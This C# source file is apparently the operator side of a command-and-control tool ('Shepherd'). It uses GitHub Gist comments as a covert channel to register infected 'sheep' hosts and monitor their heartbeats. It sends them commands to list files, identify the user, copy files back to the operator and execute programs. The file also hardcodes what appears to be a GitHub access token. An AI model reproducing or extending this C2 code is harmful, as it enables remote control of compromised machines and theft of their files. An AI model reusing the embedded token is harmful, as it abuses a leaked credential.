using System.Text.RegularExpressions;
using ConsoleTables;
using Octokit;
using Pasture;
using Pasture.Messages;

namespace Shepherd.Core;

public class ShepherdController
{
    private GitHubClient _client;
    private IDictionary<string, string?> _sheepGists;
    private IDictionary<string, bool> _sheepAlive;

    public ShepherdController()
    {
        _client = ConnectGitHubClient();
        _sheepGists = new Dictionary<string, string?>();
        _sheepAlive = new Dictionary<string, bool>();
    }

    private GitHubClient ConnectGitHubClient()
    {
        var client = new GitHubClient(new ProductHeaderValue($"shepherd"));
        var tokenAuth =
            new Credentials(
                "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");
        client.Credentials = tokenAuth;

        return client;
    }

    public async Task<IDictionary<string, string?>> GetSheepGists()
    {
        await RefreshAllSheep();
        return _sheepGists;
    }
    
    public async Task<IDictionary<string, bool>> GetSheepAlive()
    {
        await RefreshAliveStatus();
        return _sheepAlive;
    }

    public async Task RefreshAliveStatus()
    {
        _sheepAlive.Clear();
        
        foreach (var sheep in _sheepGists)
        {
            var comments = await _client.Gist.Comment.GetAllForGist(sheep.Value);

            DateTimeOffset? lastTimestamp = null;
            foreach (var comment in comments)
            {
                if (HeartBeatMessage.TryParse(comment.Body, out var heartBeatMessage))
                {
                    lastTimestamp = heartBeatMessage.Timestamp;
                }
            }

            if (DateTime.UtcNow < lastTimestamp?.AddMinutes(20))
                _sheepAlive.Add(sheep.Key,true);
            else
                _sheepAlive.Add(sheep.Key,false);

        }
    }
    
    public async Task RefreshAllSheep()
    {
        var comments = await _client.Gist.Comment.GetAllForGist("652bac55c3f50e604c1882abbec27c27");

        _sheepGists.Clear();
        foreach (var comment in comments)
        {
            if (AssignmentMessage.TryParse(comment.Body, out var assignmentMessage))
            {

                if (!_sheepGists.TryGetValue(assignmentMessage.SheepId, out var gist))
                {
                    _sheepGists.Add(assignmentMessage.SheepId, assignmentMessage.GistId);
                }
            }
        }
    }


    private async Task WaitForResponse(string sheepKey, int commentId, CommandMessage commandMessage)
    {
        Console.WriteLine("Waitng for response (it will take up to one minute)...");
        bool loading = true;
        while (loading)
        {
            await Task.Delay(5000);
            var comments = await _client.Gist.Comment.GetAllForGist(_sheepGists[sheepKey]);

            foreach (var comment in comments)
            {
                if (ResponseMessage.TryParse(comment.Body, out var responseMessage) &&
                    responseMessage.ForCommentId == commentId)
                {
                    if (responseMessage.Type == CommandType.Cp)
                    {
                        var fileName = commandMessage.Parameters.Split('/').Last();
                        var filePath = $"{Environment.CurrentDirectory}\\{fileName}";
                        Console.WriteLine($"File received: {filePath}");

                        await File.WriteAllTextAsync(filePath, responseMessage.Response);
                    }
                    else
                    {
                        Console.WriteLine(responseMessage.Response);
                    }

                    loading = false;
                }
            }
        }
    }

    public async Task CommandW(string sheepKey)
    {
        var gistId = _sheepGists[sheepKey];
        var message = new CommandMessage(CommandType.W, "");
        var comment = await _client.Gist.Comment.Create(gistId, message.GetTransportFormat());

        await WaitForResponse(sheepKey, comment.Id, message);
    }

    public async Task CommandLs(string sheepKey, string path)
    {
        var gistId = _sheepGists[sheepKey];
        var message = new CommandMessage(CommandType.Ls, path);
        var comment = await _client.Gist.Comment.Create(gistId, message.GetTransportFormat());

        await WaitForResponse(sheepKey, comment.Id, message);
    }

    public async Task CommandId(string sheepKey)
    {
        var gistId = _sheepGists[sheepKey];
        var message = new CommandMessage(CommandType.Id, "");
        var comment = await _client.Gist.Comment.Create(gistId, message.GetTransportFormat());

        await WaitForResponse(sheepKey, comment.Id, message);
    }

    public async Task CommandCopy(string sheepKey, string copyPath)
    {
        var gistId = _sheepGists[sheepKey];
        var message = new CommandMessage(CommandType.Cp, copyPath);
        var comment = await _client.Gist.Comment.Create(gistId, message.GetTransportFormat());

        await WaitForResponse(sheepKey, comment.Id, message);
    }

    public async Task CommandExecute(string sheepKey, string executePath)
    {
        var gistId = _sheepGists[sheepKey];
        var message = new CommandMessage(CommandType.Execute, executePath);
        var comment = await _client.Gist.Comment.Create(gistId, message.GetTransportFormat());

        await WaitForResponse(sheepKey, comment.Id, message);
    }
}